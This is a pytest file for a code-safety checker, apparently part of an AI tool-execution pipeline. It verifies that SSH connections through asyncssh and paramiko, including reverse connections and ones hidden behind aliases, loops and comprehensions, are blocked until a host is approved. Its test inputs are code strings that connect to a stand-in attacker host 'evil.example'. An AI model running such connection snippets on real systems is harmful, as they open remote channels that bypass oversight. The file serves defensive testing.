import pytest
from core.inference.tools import _check_code_safety
from state.ssh_approvals import approve_hosts,reset_ssh_approvals

@pytest.mark.parametrize('code',[
 "import asyncssh; asyncssh.connect_reverse('evil.example',config=None)",
 "from asyncssh import connect_reverse as connect; connect(host='evil.example',config=None)",
 "from asyncssh.connection import connect_reverse; connect_reverse('evil.example',config=None)",
 "from asyncssh import *; connect_reverse('evil.example',config=None)",
 "import paramiko\nclients=[paramiko.SSHClient()]\nfor client in clients: client.connect(hostname='evil.example')",
 "import paramiko\nc=paramiko.SSHClient()\nfor client in [c]: client.connect(hostname='evil.example')\na,b=(1,2)",
 "import paramiko\nfor client in (paramiko.SSHClient(),): client.connect(hostname='evil.example')",
 "import paramiko\nfor client,tag in [(paramiko.SSHClient(),1)]: client.connect(hostname='evil.example')",
 "import paramiko\nclients=[paramiko.SSHClient()]; pool=clients\nfor client in pool: client.connect(hostname='evil.example')",
 "import paramiko\n[client.connect(hostname='evil.example') for client in [paramiko.SSHClient()]]",
])
def test_reverse_and_loop_clients_require_approval(code):
 reset_ssh_approvals()
 assert _check_code_safety(code,session_id='review') is not None
 approve_hosts('review',['evil.example'])
 assert _check_code_safety(code,session_id='review') is None

def test_async_loop_unknown_iterable_fails_closed():
 code="import paramiko\nasync def clients(): yield paramiko.SSHClient()\nasync def main():\n async for client in clients(): client.connect(hostname='evil.example')"
 reset_ssh_approvals()
 assert _check_code_safety(code,session_id='review') is not None
 approve_hosts('review',['evil.example'])
 assert _check_code_safety(code,session_id='review') is not None

def test_ordinary_loop_is_unchanged():
 assert _check_code_safety("import paramiko\nfor item in [1,2,3]: print(item)",session_id='review') is None
